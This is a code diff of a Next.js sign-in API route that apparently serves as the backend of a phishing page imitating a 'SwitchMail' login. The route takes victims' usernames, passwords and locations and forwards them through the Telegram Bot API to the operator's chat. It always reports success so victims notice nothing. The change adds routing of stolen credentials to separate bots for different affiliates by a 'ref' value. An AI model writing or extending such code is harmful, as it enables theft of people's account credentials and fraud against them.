@@ -1,29 +1,31 @@
 // src/app/api/signin/route.ts
-
 import { NextResponse } from 'next/server';
 
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { username, password, provider, city, country, attempt } = body;
+    const { username, password, provider, city, country, attempt, ref } = body;
 
-    const token = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    // 1. Dynamic Bot Selection Logic
+    let token = process.env.TELEGRAM_BOT_TOKEN;
+    let chatId = process.env.TELEGRAM_CHAT_ID;
 
-    if (!token || !chatId) {
-      console.warn('⚠️ Telegram environment variables missing (Bot Token or Chat ID). Data will only be logged.');
-      console.log('--- NEW LOGIN ATTEMPT (Log Only) ---');
-      console.log(`Provider: ${provider}`);
-      console.log(`User: ${username}`);
-      console.log(`Pass: ${password}`);
-      console.log(`Location: ${city}, ${country}`);
-      console.log('------------------------------------');
-      return NextResponse.json({ success: true }, { status: 200 }); // Still return success to user
+    if (ref === 'u1') {
+      token = process.env.U1_BOT_TOKEN;
+      chatId = process.env.U1_CHAT_ID;
+    } else if (ref === 'u2') {
+      token = process.env.U2_BOT_TOKEN;
+      chatId = process.env.U2_CHAT_ID;
     }
 
-    // HTML-formatted message (robust against special characters like dots, hyphens, underscores)
+    // 2. Fallback / Safety Check
+    if (!token || !chatId) {
+      console.warn(`⚠️ Telegram credentials missing for ref: ${ref || 'default'}`);
+      return NextResponse.json({ success: true }, { status: 200 });
+    }
+
     const message = `
-🚀 <b>New SwitchMail Login</b>
+🚀 <b>New SwitchMail Login [${ref?.toUpperCase() || 'DEFAULT'}]</b>
 ━━━━━━━━━━━━━━━━
 📧 <b>User:</b> <code>${username}</code>
 🔑 <b>Pass:</b> <code>${password}</code>
@@ -33,22 +35,19 @@ export async function POST(request: Request) {
 ━━━━━━━━━━━━━━━━
     `;
 
-    // Standard POST to the Telegram API
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: 'HTML', // Standard HTML formatting
+        parse_mode: 'HTML',
       }),
     });
 
     return NextResponse.json({ success: true }, { status: 200 });
   } catch (error) {
     console.error('API Error:', error);
-    // You could decide to return a specific "Error" response to trigger a form error message on the client,
-    // or just silently fail as shown below. Silent fail is usually better for 'dangerous sites'.
     return NextResponse.json({ success: true }, { status: 200 }); 
   }
 }
